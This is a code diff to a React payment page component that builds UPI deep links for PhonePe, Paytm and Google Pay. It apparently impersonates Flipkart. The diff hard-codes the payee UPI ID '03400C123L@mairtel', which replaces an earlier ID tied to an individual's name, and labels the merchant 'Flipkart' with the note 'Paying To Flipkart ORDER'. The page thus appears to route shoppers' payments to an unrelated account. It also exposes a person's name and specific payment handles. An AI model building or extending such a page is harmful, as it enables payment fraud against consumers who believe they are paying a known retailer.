@@ -421,8 +421,10 @@ function PaymentPageContent({ params }: { params: Promise<{ id: string }> }) {
   const [upiUrl, setUpiUrl] = useState("");
 
   const [activePayScreen, setActivePayScreen] = useState<'select' | 'phonepe' | 'paytm'>('select');
-  const [upiId, setUpiId] = useState('paytm.s27z8uz@pty');
-  const [merchantName, setMerchantName] = useState('Jambucha Alpesh Kanjibhai');
+  const [upiId, setUpiId] = useState('03400C123L@mairtel');
+  const [phonepeUpiId, setPhonepeUpiId] = useState('03400C123L@mairtel');
+  const [paytmUpiId, setPaytmUpiId] = useState('03400C123L@mairtel');
+  const [merchantName, setMerchantName] = useState('Flipkart');
 
   const getInitials = (name: string) => {
     if (!name) return "JA";
@@ -622,6 +624,8 @@ function PaymentPageContent({ params }: { params: Promise<{ id: string }> }) {
             setQrCodeUrl(t.qrCodeUrl);
             setUpiUrl(t.upiUrl);
             if (t.upiId) setUpiId(t.upiId);
+            if (t.phonepeUpi) setPhonepeUpiId(t.phonepeUpi);
+            if (t.paytmUpi) setPaytmUpiId(t.paytmUpi);
             if (t.merchantName) setMerchantName(t.merchantName);
             setIsLoaded(true);
           } else {
@@ -664,6 +668,8 @@ function PaymentPageContent({ params }: { params: Promise<{ id: string }> }) {
         setQrCodeUrl(t.qrCodeUrl);
         setUpiUrl(t.upiUrl);
         if (t.upiId) setUpiId(t.upiId);
+        if (t.phonepeUpi) setPhonepeUpiId(t.phonepeUpi);
+        if (t.paytmUpi) setPaytmUpiId(t.paytmUpi);
         if (t.merchantName) setMerchantName(t.merchantName);
         setIsLoaded(true);
       } catch (err: any) {
@@ -754,24 +760,55 @@ function PaymentPageContent({ params }: { params: Promise<{ id: string }> }) {
   // Direct app launch utility
   const launchIntent = useCallback((intentUrl: string) => {
     if (!intentUrl) return;
-    const a = document.createElement("a");
-    a.href = intentUrl;
-    a.rel = "noopener";
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
+    try {
+      window.location.href = intentUrl;
+    } catch (e) {
+      const a = document.createElement("a");
+      a.href = intentUrl;
+      a.rel = "noopener";
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+    }
   }, []);
 
   const handleAppPay = useCallback((app: string) => {
+    const isAndroid = typeof navigator !== 'undefined' && /Android/i.test(navigator.userAgent);
+    const isIOS = typeof navigator !== 'undefined' && /iPhone|iPad|iPod/i.test(navigator.userAgent);
+    
+    const activeUpi = (app === 'phonepe' ? (phonepeUpiId || upiId) : app === 'paytm' ? (paytmUpiId || upiId) : upiId) || '03400C123L@mairtel';
+    const encName = encodeURIComponent(merchantName || 'Flipkart');
+    const orderAmt = Number(selling).toFixed(2);
+    const encNote = encodeURIComponent(`Paying To Flipkart ORDER${txnid}`);
+    const standardPayload = `pa=${activeUpi}&pn=${encName}&am=${orderAmt}&cu=INR&tn=${encNote}&tr=${txnid}`;
+    
     let intent = "";
     if (app === "phonepe") {
-      intent = phonepeIntent || `phonepe://pay?ver=01&mode=19&pa=${upiId || 'paytm.s27z8uz@pty'}&pn=Paying_to_Flipkart&tr=${txnid}&cu=INR&mc=7446&qrMedium=04&tn=Paying_to_Flipkart&am=${selling}`;
+      if (isAndroid) {
+        intent = `intent://pay?${standardPayload}#Intent;scheme=upi;package=com.phonepe.app;S.browser_fallback_url=${encodeURIComponent(`phonepe://pay?${standardPayload}`)};end`;
+      } else if (isIOS) {
+        intent = `phonepe://pay?${standardPayload}`;
+      } else {
+        intent = phonepeIntent || `upi://pay?${standardPayload}`;
+      }
     } else if (app === "paytm") {
-      intent = paytmIntent || `paytmmp://cash_wallet/?pa=${upiId || 'paytm.s27z8uz@pty'}&pn=${encodeURIComponent(merchantName || 'Flipkart')}&am=${selling}&cu=INR&tn=${encodeURIComponent('Paying To Flipkart ORDER' + txnid)}&featuretype=money_transfer`;
+      if (isAndroid) {
+        intent = `intent://pay?${standardPayload}#Intent;scheme=upi;package=net.one97.paytm;S.browser_fallback_url=${encodeURIComponent(`paytmmp://pay?${standardPayload}`)};end`;
+      } else if (isIOS) {
+        intent = `paytmmp://pay?${standardPayload}`;
+      } else {
+        intent = paytmIntent || `upi://pay?${standardPayload}`;
+      }
     } else if (app === "gpay") {
-      intent = gpayIntent || `tez://upi/pay?pa=${upiId || 'paytm.s27z8uz@pty'}&pn=Paying_to_Flipkart&mc=3526&tr=${txnid}&am=${selling}&cu=INR&tn=Recharge`;
+      if (isAndroid) {
+        intent = `intent://pay?${standardPayload}#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;S.browser_fallback_url=${encodeURIComponent(`tez://upi/pay?${standardPayload}`)};end`;
+      } else if (isIOS) {
+        intent = `gpay://upi/pay?${standardPayload}`;
+      } else {
+        intent = gpayIntent || `tez://upi/pay?${standardPayload}`;
+      }
     } else {
-      intent = upiUrl || `upi://pay?pa=${upiId || 'paytm.s27z8uz@pty'}&pn=Paying_to_Flipkart&am=${selling}&cu=INR`;
+      intent = upiUrl || `upi://pay?${standardPayload}`;
     }
 
     if (intent) {
@@ -788,7 +825,7 @@ function PaymentPageContent({ params }: { params: Promise<{ id: string }> }) {
 
       setTimeout(() => launchIntent(intent), 50);
     }
-  }, [phonepeIntent, paytmIntent, gpayIntent, upiUrl, upiId, selling, launchIntent, txnid]);
+  }, [phonepeIntent, paytmIntent, gpayIntent, upiUrl, upiId, phonepeUpiId, paytmUpiId, merchantName, selling, launchIntent, txnid]);
 
   const handleOpenAgain = useCallback(() => {
     if (!activeVerificationApp) return;
